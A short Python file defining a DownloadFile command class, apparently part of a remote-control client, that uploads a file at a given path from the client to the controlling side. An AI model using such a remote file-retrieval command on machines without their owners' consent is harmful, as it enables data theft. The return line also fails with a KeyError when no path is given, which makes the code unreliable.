from commands.Command import Command
from client import communication as c


class DownloadFile(Command):
    def run(self):
        # print(self.params)
        if "path" in self.params:
            c.upload_file(self.params["path"])
        return f'DownloadFile complete: {self.params["path"]}'
